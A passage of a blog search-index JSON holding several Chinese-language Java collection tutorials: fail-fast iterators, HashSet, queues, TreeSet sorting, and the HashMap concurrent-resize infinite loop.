和Vector是采用数组方式存储数据，此数组元素数大于实际存储的数据以便增加和插入元素，都允许直接序号索引元素，但是插入数据要涉及到数组元素移动等内存操作，所以索引数据快，插入数据慢，Vector由于使用了synchronized方法（线程安全）所以性能上比ArrayList要差，LinkedList使用双向链表实现存储，按序号索引数据需要进行向前或向后遍历，但是插入数据时只需要记录本项的前后项即可，所以插入数度较快。 ArrayList和LinkedList的区别 ArrayList是实现了基于动态数组的数据结构，LinkedList基于链表的数据结构。 对于随机访问get和set，ArrayList速度优于LinkedList，因为LinkedList要移动指针。 对于新增和删除操作add和remove，LinedList比较占优势，因为ArrayList要移动数据。 这一点要看实际情况的。若只对单条数据插入或删除，ArrayList的速度反而优于LinkedList。但若是批量随机的插入删除数据，LinkedList的速度大大优于ArrayList. 因为ArrayList每插入一条数据，要移动插入点及之后的所有数据。","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】集合类-Iterable接口的Fail-Fast机制","date":"2019-03-15T07:23:18.000Z","path":"2019/03/15/【Java】集合类-Iterable接口的fail-fast机制/","text":"Fail-Fast问题如果你想在使用Iterator（迭代器）进行遍历的过程中，移除List中的某个元素，只能调用iterator.remove方法，而不能调用list.remove()方法，否则一定会抛出并发修改异常（java.util.ConcurrentModificationException）。 注意，当这个异常被抛出时，并不意味着这个list一定正在被多个线程同时使用，而在同一个线程中既一边遍历 list，一边调用list.remove()方法，也会抛出ConcurrentModificationException。 一个错误的实现12345678910111213141516171819202122public class Test1 &#123; private static List&lt;Integer&gt; list = new ArrayList&lt;&gt;(); public static void main(String[] args) &#123; for (int i = 0; i &lt; 10; i++) &#123; list.add(i); &#125; Iterator&lt;Integer&gt; iterator = list.iterator(); while (iterator.hasNext()) &#123; int i = iterator.next(); // remove a specific element list.remove(5); System.out.println(\"ThreadOne 遍历:\" + i); try &#123; Thread.sleep(10); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125; &#125;&#125; 执行结果12345ThreadOne 遍历:0Exception in thread &quot;main&quot; java.util.ConcurrentModificationException at java.util.ArrayList$Itr.checkForComodification(ArrayList.java:909) at java.util.ArrayList$Itr.next(ArrayList.java:859) at com.concretepage.lang.Test1.main(Test1.java:15) 又一个错误的实现类似地，如果我们在另一个线程中调用list.remove()，情况也是一样的（同样会抛出并发修改异常 java.util.ConcurrentModificationException）。 12345678910111213141516171819202122232425262728293031323334353637383940public class Test2 &#123; private static List&lt;Integer&gt; list = new ArrayList&lt;&gt;(); private static class threadOne extends Thread &#123; public void run() &#123; Iterator&lt;Integer&gt; iterator = list.iterator(); while (iterator.hasNext()) &#123; int i = iterator.next(); System.out.println(\"ThreadOne 遍历:\" + i); try &#123; Thread.sleep(10); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125; &#125; &#125; private static class threadTwo extends Thread &#123; public void run() &#123; int i = 0; while (i &lt; 6) &#123; System.out.println(\"ThreadTwo run：\" + i); if (i == 3) &#123; list.remove(i); break; &#125; i++; &#125; &#125; &#125; public static void main(String[] args) &#123; for (int i = 0; i &lt; 10; i++) &#123; list.add(i); &#125; new threadOne().start(); new threadTwo().start(); &#125;&#125; 执行结果123456789ThreadOne 遍历:0ThreadTwo run：0ThreadTwo run：1ThreadTwo run：2ThreadTwo run：3Exception in thread &quot;Thread-0&quot; java.util.ConcurrentModificationException at java.util.ArrayList$Itr.checkForComodification(ArrayList.java:909) at java.util.ArrayList$Itr.next(ArrayList.java:859) at com.concretepage.lang.TestString$threadOne.run(Test3.java:12) 一个正确的实现123456789101112131415161718public class Test3 &#123; private static List&lt;Integer&gt; list = new ArrayList&lt;&gt;(); public static void main(String[] args) &#123; for (int i = 0; i &lt; 10; i++) &#123; list.add(i); &#125; Iterator&lt;Integer&gt; iterator = list.iterator(); while (iterator.hasNext()) &#123; int i = iterator.next(); if (i == 3) // remove a specific element iterator.remove(); &#125; System.out.println(list); &#125;&#125; 执行结果1[0, 1, 2, 4, 5, 6, 7, 8, 9] Fail-Fast 产生原因Fail-Fast 产生的原因就在于程序在对 collection 进行迭代时，同时对这个collection进行了修改，这时迭代器就会抛出 ConcurrentModificationException 异常信息，从而产生 Fail-Fast。 我们来看看ArrayList中迭代器的源代码： 123456789101112131415161718192021222324252627private class Itr implements Iterator&lt;E&gt; &#123; int cursor; int lastRet = -1; int expectedModCount = ArrayList.this.modCount; public boolean hasNext() &#123; return (this.cursor != ArrayList.this.size); &#125; public E next() &#123; checkForComodification(); /** 省略此处代码 */ &#125; public void remove() &#123; if (this.lastRet &lt; 0) throw new IllegalStateException(); checkForComodification(); /** 省略此处代码 */ &#125; final void checkForComodification() &#123; if (ArrayList.this.modCount == this.expectedModCount) return; throw new ConcurrentModificationException(); &#125; &#125; 从上面的源代码我们可以看出，在调用迭代器实例对象的next()、remove()方法时，都会在内部调用checkForComodification()方法，该方法主要就是检查是否满足modCount == expectedModCount 。 若不满足，则抛出ConcurrentModificationException 异常，从而产生fail-fast机制。 而ArrayList的iterator()实现如下，本质返回一个新实施化的Itr类。 123public Iterator&lt;E&gt; iterator() &#123; return new Itr();&#125; 而expectedModCount 是在Itr中定义的： 123private class Itr implements Iterator&lt;E&gt; &#123; int expectedModCount = modCount; ... expectedModCount的值在Itr对象的整个生命周期中，是没被修改的，所以会变的就是modCount。modCount是在 AbstractList 中定义的，为全局变量： 1protected transient int modCount = 0; 那么modCount什么时候，因为什么原因而发生改变呢？ 事实上，只要调用了ArrayList实例对象的add()、remove()或clear()方法中的任何一个（即只要改变ArrayList中元素的个数）都会导致modCount的改变。 此后，expectedModCount 与modCount 的值就会不相等，从而引发fail-fast机制。 Fail-Fast 解决办法可以使用CopyOnWriteArrayList来替换ArrayList。 CopyOnWriteArrayList为何物？ CopyOnWriteArrayList是ArrayList 的一个线程安全的变体，其中所有可变操作（add、set 等等）都是通过对底层数组进行一次新的复制来实现的。 因此，该类产生的开销比较大，但是在两种情况下，它非常适合使用： 在不能或不想进行同步遍历，但又需要从并发线程中排除冲突时。 当遍历操作的数量大大超过可变操作的数量时。 遇到这两种情况使用CopyOnWriteArrayList来替代ArrayList再适合不过了。 那么，为什么CopyOnWriterArrayList可以替代ArrayList呢？ 第一、CopyOnWriterArrayList的无论是从数据结构、定义都和ArrayList一样。它和ArrayList一样，同样是实现List接口，底层使用数组实现。在方法上也包含add、remove、clear、iterator等方法。 第二、CopyOnWriterArrayList根本就不会产生ConcurrentModificationException异常，也就是它使用迭代器完全不会产生fail-fast机制。 Reference Java提高篇（三四）—–fail-fast机制 - https://www.cnblogs.com/chenssy/p/3870107.html 为什么阿里巴巴禁止在 foreach 循环里进行元素的 remove/add 操作 - https://www.hollischuang.com/archives/3304","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】集合类 - HashSet","date":"2019-03-15T03:48:51.000Z","path":"2019/03/15/【Java】集合类-HashSet/","text":"HashSet类HashSet类实现了Set接口，底层由HashMap来实现（后面进行分析），为哈希表结构，新增元素相当于HashMap的key，value默认为一个固定的Object。在我看来，HashSet相当于一个阉割版的HashMap。 当有元素插入的时候，会计算元素的hashCode值，将元素插入到哈希表对应的位置中来。 特点 不允许出现重复因素； 允许插入Null值； 元素无序（添加顺序和遍历顺序不一致）； 线程不安全，若2个线程同时操作HashSet，必须通过代码实现同步； HashSet的add(E e)方法让我们来看看HashSet的add(E e)方法： 123public boolean add(E e) &#123; return map.put(e, PRESENT)==null;&#125; 在底层HashSet调用了HashMap的 put(K key, V value) 方法，而对于每个添加到HashSet中的元素在HashMap的值均为PRESENT，它是一个静态的Object对象。 当调用HashSet的 add(E e) 方法，以添加HashMap的集合元素时，实际上转变为调用HashMap的 put(K key, V value) 方法来添加一个 key-value对，其中key对应 add(E e) 方法中提供的e，而value对应一个PRESENT对象（声明为private static final Object PRESENT = new Object();）。 当向HashMap新放入一个Entry时，这个Entry的key与HashMap中原有一个Entry的key相同（hashCode()返回值相等，通过equals比较也返回true）时，新添加的Entry的value将覆盖原来Entry的value，但key不会有任何改变。因此，如果向HashSet中添加一个已经存在的元素，新添加的集合元素（底层由HashMap的key保存）不会覆盖已有的集合元素。 判断HashSet元素是否重复12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152class Person &#123; private String name; private int age; public Person(String name, int age) &#123; this.name = name; this.age = age; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125; @Override public boolean equals(Object obj) &#123; if (this == obj) &#123; return true; &#125; if (null != obj &amp;&amp; obj instanceof Person) &#123; Person p = (Person) obj; if (name.equals(p.name) &amp;&amp; age == p.age) &#123; return true; &#125; &#125; return false; &#125;&#125;public class HashSetTest &#123; public static void main(String[] args) &#123; HashSet&lt;Person&gt; set = new HashSet&lt;Person&gt;(); Person p1 = new Person(\"zhangsan\", 22); Person p2 = new Person(\"zhangsan\", 22); set.add(p1); set.add(p2); System.out.println(set.size()); &#125;&#125; 分析上面程序中，向HashSet里添加两个完全一样的Person(“zhangsan”, 22)对象，实际输出对象个数为2，这是因为HashSet判断两个对象相等的标准除了要求通过equals()方法返回true之外，还要求两个对象的hashCode()返回值相等。而上面程序没有重写Person类的hashCode()方法，两个Person对象的hashCode()返回值并不相同，因此HashSet会把它们当成2个对象处理。 由此可见，当试图把某个类的对象当成HashMap的key，或者试图将这个类的对象放入HashSet中保存时，重写该类的equals(Object obj)方法和hashCode()方法很重要，而且这两个方法的返回值必须一致。当该类的两个hashCode()返回值相同时，它们通过equals()方法比较也应该返回true。通常来说，所有参与计算hashCode()返回值的关键属性，都应该用于作为equals()比较的标准。 如下程序就正确重写了Person类的hashCode()方法和equals()方法： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758class Person &#123; private String name; private int age; public Person(String name, int age) &#123; this.name = name; this.age = age; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125; @Override public boolean equals(Object obj) &#123; if (this == obj) &#123; return true; &#125; if (null != obj &amp;&amp; obj instanceof Person) &#123; Person p = (Person) obj; if (name.equals(p.name)) &#123; return true; &#125; &#125; return false; &#125; @Override public int hashCode() &#123; return this.name.hashCode(); &#125;&#125;public class HashSetTest &#123; public static void main(String[] args) &#123; HashSet&lt;Person&gt; set = new HashSet&lt;Person&gt;(); Person p1 = new Person(\"zhangsan\", 22); Person p2 = new Person(\"zhangsan\", 22); set.add(p1); set.add(p2); System.out.println(set.size()); &#125;&#125; Reference HashSet实现原理及源码分析 - https://blog.csdn.net/itmyhome1990/article/details/76212556","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】集合类-Queue","date":"2019-03-15T02:21:32.000Z","path":"2019/03/15/【Java】集合类-Queue/","text":"队列（Queue）队列（Queue）是计算机中的一种数据结构，保存在其中的数据具有“先进先出（FIFO，First In First Out）”的特性。 如果，你不明白“先进先出”是什么，试想下排队的场景，最先进来的人解决完问题后，最早离开—这就叫“先进先出”； 当队伍中有新来的人时，需要排在队伍的末端；而当队伍中有人解决完问题时，会从队伍的前端离开。 在队列中，我们管队伍的末端叫做“队尾”，管队伍的前端叫“队头”；新来的人，称之为“入队”。而离开的人，称之为“出队”； 稍有不同的是，在数据结构中，队列不支持从队伍的中间插入和离开，只能从头尾进行。而真实生活中，我们的队伍可没有这么和谐！！！！ 还有一点是，当没有人在排队时，我们称之为“空队”，也就是队列为空的情况。 相关接口Queue接口 - （单端）队列Queue接口与List、Set同一级别，都是继承了Collection接口。 由于LinkedList实现了Deque接口，而Deque接口继承了Queue接口。自然地，LinkedList类也实现了Queue接口 1234567891011121314public interface Queue&lt;E&gt; extends Collection&lt;E&gt; &#123; //插入（抛出异常） boolean add(E e); //插入（返回特殊值） boolean offer(E e); //移除（抛出异常） E remove(); //移除（返回特殊值） E poll(); //检查（抛出异常） E element(); //检查（返回特殊值） E peek();&#125; Deque接口 - 双端队列（Double Ended Queue）Deque，即双端队列（Double Ended Queue）。 Deque接口继承了Queue接口，即是双端队列，一个特殊的队列。 双端队列是指该队列两端的元素既能入队（offer）也能出队（poll）； 如果将Deque限制为只能从一端入队和出队，则可实现栈的数据结构。对于栈而言，有入栈（push）和出栈（pop），遵循先进后出原则。 由于Deque接口继承Queue接口，当Deque当做队列（queue）使用时，只需要在头部删除，尾部添加即可。 除此之外，Deque也可以当做栈（stack）使用，这时入栈、出栈都在双端队列的头部进行。 1234567891011121314151617public interface Deque&lt;E&gt; extends Queue&lt;E&gt; &#123; // *** Deque methods *** void addFirst(E e); void addLast(E e); boolean offerFirst(E e); boolean offerLast(E e); E removeFirst(); E removeLast(); E pollFirst(); E pollLast(); E getFirst(); E getLast(); E peekFirst(); E peekLast(); boolean removeFirstOccurrence(Object o); boolean removeLastOccurrence(Object o);&#125; 实现队列可以有很多种办法，例如，可以使用数组做存储，可以使用链表做存储。 Deque接口的实现类非并发场景对于非并发的情况，有两个Deque即可的实现类： LinkedList 大小可变的链表双端队列，允许元素为 null； ArrayDeque 大下可变的数组双端队列，不允许 null。 并发场景在并发场景下，推荐使用LinkedBlockingDeque类，它是一个阻塞的双向队列。 BlockingQueue接口 - 阻塞队列简而言之就是当队列满时，插入阻塞；当队列为空时，删除（取出）阻塞。常用于生产者和消费者场景。 ArrayBlockingQueue：一个由数组结构组成的有界阻塞队列。 LinkedBlockingQueue：一个由链表结构组成的有界阻塞队列。 PriorityBlockingQueue：一个支持优先级排序的无界阻塞队列。 DelayQueue：一个使用优先级队列实现的无界阻塞队列。 SynchronousQueue：一个不存储元素的阻塞队列。 LinkedTransferQueue：一个由链表结构组成的无界阻塞队列。 LinkedBlockingDeque：一个由链表结构组成的双向阻塞队列。 ArrayBlockingQueue基于数组的阻塞队列实现，在ArrayBlockingQueue内部，维护了一个定长数组，以便缓存队列中的数据对象，其内部没有实现读写分离，长度是需要定义的，按照先进先出（FIFO）的原则对元素进行排序。是有界队列（bounded），在很多场合非常适合使用。 默认情况下不保证线程公平的访问队列，所谓公平访问队列是指阻塞的线程，可以按照阻塞的先后顺序访问队列，即先阻塞线程先访问队列。非公平性是对先等待的线程是非公平的，当队列可用时，阻塞的线程都可以争夺访问队列的资格，有可能先阻塞的线程最后才访问队列。为了保证公平性，通常会降低吞吐量。 LinkedBlockingQueueLinkedBlockingQueue 是一个用链表实现的有界阻塞队列。此队列的默认和最大长度为Integer.MAX_VALUE。此队列按照先进先出的原则对元素进行排序。 PriorityBlockingQueuePriorityBlockingQueue是一个支持优先级的无界(unbounded)阻塞队列。默认情况下元素采取自然顺序升序排列。也可以自定义类实现compareTo()方法来指定元素排序规则，或者初始化PriorityBlockingQueue时，指定构造参数Comparator来对元素进行排序。需要注意的是不能保证同优先级元素的顺序。 DelayQueue带有延迟时间的Queue，其中的元素只有当前指定的延迟时间到了，才能够从队列中获取该元素。DelayQueue中的元素必须实现Delayed接口，DelayQueue是一个无界队列，应用场景很多 PriorityQueue类（优先队列）PriorityQueue类是Java 中优先队列的实现，队列元素在队列中的顺序，不是元素被加入队列的时间先后顺序，而是队列元素的大小。换句话说，最小的元素会永远排在这个队列的头部（即使这个元素是最后进入队列的）。 因此当调用peek()或pool()方法取出队列中头部的元素时，取出的是队列中的最小元素（而不是最早进入队列的元素）。 ArrayDeque类ArrayDeque是Deque接口的具体实现类，底层使用数组来实现。 默认长度是16，根据添加的元素个数，动态扩容。 ArrayDeque是一个循环队列（circular queue）。它的实现比较高效，它的思路是这样：引入两个游标，head 和 tail，如果向队列里，插入一个元素，就把 tail 向后移动。如果从队列中删除一个元素，就把head向后移动。 我们看一下示意图： 如果向队列中插入D，那么，队列就会变成这样： 如果此时，从队列的头部把A删除，那只需要移动head指针即可： 通过这种方式，就可以使元素出队，入队的速度加快了。那如果 tail 已经指向了数组的最后一位怎么办呢？其实呀，只需要将tail重新指向数组的头就可以了。for example，tail已经指向数组最后一位了，再插入一个元素，就会变成这样： 使用这种方式，就可以循环使用一个数组来实现队列了。 Reference Java集合–Queue队列介绍 - https://www.jianshu.com/p/b3676b3f2bb7 Java集合（七） Queue详解 - https://juejin.im/post/5a3763ed51882506a463b740#heading-4 BlockingQueue接口及其实现 - https://www.jianshu.com/p/0c87f39bc569","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】集合类-TreeSet","date":"2019-03-15T01:50:21.000Z","path":"2019/03/15/【Java】集合类-TreeSet/","text":"TreeSet从名字上可以看出，此集合的实现和树结构有关。 与HashSet集合类似，TreeSet基于TreeMap来实现的，其底层结构为红黑树（特殊的二叉查找树，即在每个结点上增加一个存储位表示结点的颜色，可以是Red或Black）。 与HashSet不同的是，TreeSet具有排序功能，分为自然排序（123456）和自定义排序两类，默认是自然排序；在程序中，我们可以按照任意顺序将元素插入到集合中，等到遍历时TreeSet会按照一定顺序输出–倒序或者升序。 特点 对插入的元素进行排序，是一个有序的集合（这是主要与HashSet的区别）; 底层使用红黑树结构，而不是哈希表结构； 允许插入Null值； 不允许插入重复元素； 线程不安全。 TreeSet基本操作1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374public class TreeSetTest &#123; public static void main(String[] agrs)&#123; TreeSet&lt;String&gt; treeSet = new TreeSet&lt;String&gt;(); System.out.println(\"TreeSet初始化容量大小：\"+treeSet.size()); //元素添加： treeSet.add(\"my\"); treeSet.add(\"name\"); treeSet.add(\"jiaboyan\"); treeSet.add(\"hello\"); treeSet.add(\"world\"); treeSet.add(\"1\"); treeSet.add(\"2\"); treeSet.add(\"3\"); System.out.println(\"TreeSet容量大小：\" + treeSet.size()); System.out.println(\"TreeSet元素顺序为：\" + treeSet.toString()); //增加for循环遍历： for(String str:treeSet)&#123; System.out.println(\"遍历元素：\"+str); &#125; //迭代器遍历：升序 Iterator&lt;String&gt; iteratorAesc = treeSet.iterator(); while(iteratorAesc.hasNext())&#123; String str = iteratorAesc.next(); System.out.println(\"遍历元素升序：\"+str); &#125; //迭代器遍历：降序 Iterator&lt;String&gt; iteratorDesc = treeSet.descendingIterator(); while(iteratorDesc.hasNext())&#123; String str = iteratorDesc.next(); System.out.println(\"遍历元素降序：\"+str); &#125; //元素获取:实现NavigableSet接口 String firstEle = treeSet.first();//获取TreeSet头节点： System.out.println(\"TreeSet头节点为：\" + firstEle); // 获取指定元素之前的所有元素集合：(不包含指定元素) SortedSet&lt;String&gt; headSet = treeSet.headSet(\"jiaboyan\"); System.out.println(\"jiaboyan节点之前的元素为：\"+headSet.toString()); //获取给定元素之间的集合：（包含头，不包含尾） SortedSet subSet = treeSet.subSet(\"1\",\"world\"); System.out.println(\"1--jiaboan之间节点元素为：\"+subSet.toString()); //集合判断： boolean isEmpty = treeSet.isEmpty(); System.out.println(\"TreeSet是否为空：\"+isEmpty); boolean isContain = treeSet.contains(\"who\"); System.out.println(\"TreeSet是否包含who元素：\"+isContain); //元素删除： boolean jiaboyanRemove = treeSet.remove(\"jiaboyan\"); System.out.println(\"jiaboyan元素是否被删除\"+jiaboyanRemove); //集合中不存在的元素，删除返回false boolean whoRemove = treeSet.remove(\"who\"); System.out.println(\"who元素是否被删除\"+whoRemove); //删除并返回第一个元素：如果set集合不存在元素，则返回null String pollFirst = treeSet.pollFirst(); System.out.println(\"删除的第一个元素：\"+pollFirst); //删除并返回最后一个元素：如果set集合不存在元素，则返回null String pollLast = treeSet.pollLast(); System.out.println(\"删除的最后一个元素：\"+pollLast); treeSet.clear();//清空集合: &#125;&#125; TreeSet元素排序在前面，我们提到了TreeSet是一个有序集合，可以对集合元素排序，其中分为自然排序和自定义排序，那么这两种方式如何实现呢？ 情况1首先，我们通过JDK提供的对象来展示，我们使用String、Integer： 1234567891011121314151617181920212223public class TreeSetTest &#123; public static void main(String[] agrs)&#123; naturalSort(); &#125; //自然排序顺序：升序 public static void naturalSort()&#123; TreeSet&lt;String&gt; treeSetString = new TreeSet&lt;String&gt;(); treeSetString.add(\"a\"); treeSetString.add(\"z\"); treeSetString.add(\"d\"); treeSetString.add(\"b\"); System.out.println(\"字母顺序：\" + treeSetString.toString()); TreeSet&lt;Integer&gt; treeSetInteger = new TreeSet&lt;Integer&gt;(); treeSetInteger.add(1); treeSetInteger.add(24); treeSetInteger.add(23); treeSetInteger.add(6); System.out.println(treeSetInteger.toString()); System.out.println(\"数字顺序：\" + treeSetString.toString()); &#125;&#125; 结果12字母顺序：[a, b, d, z]数字顺序：[1, 6, 23, 24] 情况2 - 自定义对象接下来，我们自定义对象，看能否实现： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455public class App&#123; private String name; private Integer age; public App()&#123;&#125; public App(String name,Integer age)&#123; this.name = name; this.age = age; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public Integer getAge() &#123; return age; &#125; public void setAge(Integer age) &#123; this.age = age; &#125; public static void main(String[] args )&#123; System.out.println( \"Hello World!\" ); &#125;&#125;public class TreeSetTest &#123; public static void main(String[] agrs)&#123; customSort(); &#125; //自定义排序顺序：升序 public static void customSort()&#123; TreeSet&lt;App&gt; treeSet = new TreeSet&lt;App&gt;(); //排序对象： App app1 = new App(\"hello\",10); App app2 = new App(\"world\",20); App app3 = new App(\"my\",15); App app4 = new App(\"name\",25); //添加到集合： treeSet.add(app1); treeSet.add(app2); treeSet.add(app3); treeSet.add(app4); System.out.println(\"TreeSet集合顺序为：\"+treeSet); &#125;&#125; 结果12抛出异常：提示App不能转换为Comparable对象：Exception in thread &quot;main&quot; java.lang.ClassCastException: com.jiaboyan.collection.App cannot be cast to java.lang.Comparable 分析为什么会报错呢？ 123456compare(key, key); // type (and possibly null) checkfinal int compare(Object k1, Object k2) &#123; return comparator==null ? ((Comparable&lt;? super K&gt;)k1).compareTo((K)k2) : comparator.compare((K)k1, (K)k2);&#125; 通过查看源码发现，在TreeSet调用add方法时，会调用到底层TreeMap的put方法，在put方法中会调用到compare(key, key)方法，进行key大小的比较。 在比较的时候，会将传入的key进行类型强转，所以当我们自定义的App类进行比较的时候，自然就会抛出异常，因为App类并没有实现Comparable接口。 将App实现Comparable接口，再做比较: 1234567891011121314151617181920212223242526272829303132333435public class App implements Comparable&lt;App&gt;&#123; private String name; private Integer age; public App()&#123;&#125; public App(String name,Integer age)&#123; this.name = name; this.age = age; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public Integer getAge() &#123; return age; &#125; public void setAge(Integer age) &#123; this.age = age; &#125; //自定义比较：先比较name的长度，在比较age的大小； public int compareTo(App app) &#123; //比较name的长度： int num = this.name.length() - app.name.length(); //如果name长度一样，则比较年龄的大小： return num == 0 ? this.age - app.age : num; &#125; @Override public String toString() &#123; return \"App&#123;\" + \"name='\" + name + '\\'' + \", age=\" + age + '&#125;'; &#125;&#125; 结果1TreeSet集合顺序为：[App&#123;name=&apos;my&apos;, age=15&#125;, App&#123;name=&apos;name&apos;, age=25&#125;, App&#123;name=&apos;hello&apos;, age=10&#125;, App&#123;name=&apos;world&apos;, age=20&#125;] 情况3 - 实现Comparetor&lt;T&gt;接口此外，还有另一种方式，那就是实现Comparetor接口，并重写compare方法； 123456789//自定义App类的比较器：public class AppComparator implements Comparator&lt;App&gt; &#123; //比较方法：先比较年龄，年龄若相同在比较名字长度； public int compare(App app1, App app2) &#123; int num = app1.getAge() - app2.getAge(); return num == 0 ? app1.getName().length() - app2.getName().length() : num; &#125;&#125; 此时，App不用在实现Comparerable接口了，单纯的定义一个类即可； 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556public class App&#123; private String name; private Integer age; public App()&#123;&#125; public App(String name,Integer age)&#123; this.name = name; this.age = age; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public Integer getAge() &#123; return age; &#125; public void setAge(Integer age) &#123; this.age = age; &#125; public static void main(String[] args )&#123; System.out.println( \"Hello World!\" ); &#125;&#125;public class TreeSetTest &#123; public static void main(String[] agrs)&#123; customSort(); &#125; //自定义比较器：升序 public static void customComparatorSort()&#123; TreeSet&lt;App&gt; treeSet = new TreeSet&lt;App&gt;(new AppComparator()); //排序对象： App app1 = new App(\"hello\",10); App app2 = new App(\"world\",20); App app3 = new App(\"my\",15); App app4 = new App(\"name\",25); //添加到集合： treeSet.add(app1); treeSet.add(app2); treeSet.add(app3); treeSet.add(app4); System.out.println(\"TreeSet集合顺序为：\"+treeSet); &#125;&#125; 结果1TreeSet集合顺序为：[App&#123;name=&apos;hello&apos;, age=10&#125;, App&#123;name=&apos;my&apos;, age=15&#125;, App&#123;name=&apos;world&apos;, age=20&#125;, App&#123;name=&apos;name&apos;, age=25&#125;] Reference Java集合–Set(基础) - https://www.jianshu.com/p/b48c47a42916","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】集合类-HashMap的并发问题","date":"2019-03-14T14:25:03.000Z","path":"2019/03/14/【Java】集合类-HashMap的并发问题/","text":"背景由于HashMap不是线程安全的，因此在并发环境下可能会发生死锁问题，且导致CPU占用率接近100%。 原因是在Java语言在并发情况下使用HashMap造成Race Condition，从而导致死循环。 可以搜索“HashMap Infinite Loop”以深入了解这个问题。 分析put()方法的执行过程该问题的成因涉及到四个方法，最初的起因是调用put()方法。 下面，我们来看一下Java的HashMap的源代码。 调用put() 方法一讲一个&lt;Key,Value&gt;添加到HashMap表中： 123456789101112131415161718192021public V put(K key, V value)&#123; ...... //算Hash值 int hash = hash(key.hashCode()); int i = indexFor(hash, table.length); //如果该key已被插入，则替换掉旧的value （链接操作） for (Entry&lt;K,V&gt; e = table[i]; e != null; e = e.next) &#123; Object k; if (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) &#123; V oldValue = e.value; e.value = value; e.recordAccess(this); return oldValue; &#125; &#125; modCount++; //该key不存在，需要增加一个结点 addEntry(hash, key, value, i); return null;&#125; 检查容量是否超标 12345678void addEntry(int hash, K key, V value, int bucketIndex)&#123; Entry&lt;K,V&gt; e = table[bucketIndex]; table[bucketIndex] = new Entry&lt;K,V&gt;(hash, key, value, e); //查看当前的size是否超过了我们设定的阈值threshold，如果超过，需要resize if (size++ &gt;= threshold) resize(2 * table.length);&#125; 新建一个更大尺寸的hash表，然后把数据从老的Hash表中迁移到新的Hash表中。 123456789101112void resize(int newCapacity)&#123; Entry[] oldTable = table; int oldCapacity = oldTable.length; ...... //创建一个新的Hash Table Entry[] newTable = new Entry[newCapacity]; //将Old Hash Table上的数据迁移到New Hash Table上 transfer(newTable); table = newTable; threshold = (int)(newCapacity * loadFactor);&#125; 将数据从老的Hash表中迁移到新的Hash表的过程： 1234567891011121314151617181920void transfer(Entry[] newTable)&#123; Entry[] src = table; int newCapacity = newTable.length; //下面这段代码的意思是： // 从OldTable里摘一个元素出来，然后放到NewTable中 for (int j = 0; j &lt; src.length; j++) &#123; Entry&lt;K,V&gt; e = src[j]; if (e != null) &#123; src[j] = null; do &#123; Entry&lt;K,V&gt; next = e.next; int i = indexFor(e.hash, newCapacity); e.next = newTable[i]; newTable[i] = e; e = next; &#125; while (e != null); &#125; &#125;&#125; 正常的ReHash的过程 我假设了我们的hash算法就是简单的用key mod 一下表的大小（也就是数组的长度）。 最上面的是old hash 表，其中的Hash表的size=2, 所以key = 3, 7, 5，在mod 2以后都冲突在table[1]这里了。 接下来的三个步骤是Hash表 resize成4，然后所有的&lt;key,value&gt; 重新rehash的过程 并发下的Rehash假设我们有两个线程，在下图中分别用红色和浅蓝色标注。 同时，假设线程一执行到下面代码位置就被调度器挂起了，而轮到线程二执行。 1234567do &#123; Entry&lt;K,V&gt; next = e.next; // &lt;--假设线程一执行到这里就被调度挂起了 int i = indexFor(e.hash, newCapacity); e.next = newTable[i]; newTable[i] = e; e = next;&#125; while (e != null); 线程一被挂起时，处于以下状态： 而线程二开始执行了，执行完了整个rehash过程，此时状态如下图所示： 值得一提的是，这时，key为7的next指针指向了key为3的元素。 这时，又轮到线程一执行了（线程一被调度回来），紧接着执行循环体中的下面三句代码： 123e.next = newTable[i];newTable[i] = e;e = next; 此时的状态如下所示： 这时候一切正常。 线程一继续执行下一个循环： 当执行完 Entry&lt;K,V&gt; next = e.next; 后： 继续执行下面代码： 1234int i = indexFor(e.hash, newCapacity);e.next = newTable[i];newTable[i] = e;e = next; 执行完成后，为此状态： 线程一继续仍然再执行下一个循环： 12345Entry&lt;K,V&gt; next = e.next;int i = indexFor(e.hash, newCapacity);e.next = newTable[i];newTable[i] = e;e = next; 执行完成 Entry&lt;K,V&gt; next = e.next; 后，如下情况： 接下来，执行 e.next = newTable[i]; 后会导致下面的情况： ![image-20190314133719175 copy](assets/image-20190314133719175 copy.png) 而执行完 newTable[i] = e; 和 e = next; 后，则会形成环，如下所示： 此后，由于e为null，因此跳出循环。 当调用到hashMap.get()方法，且进入索引为3的Bucket，而且所提供的key不在索引为3的Bucket中所包含的所有元素的key范围内时（比如调用hashMap.get(11)），则会进入无限循环（infinite loop）。 Reference 疫苗：JAVA HASHMAP的死循环 - 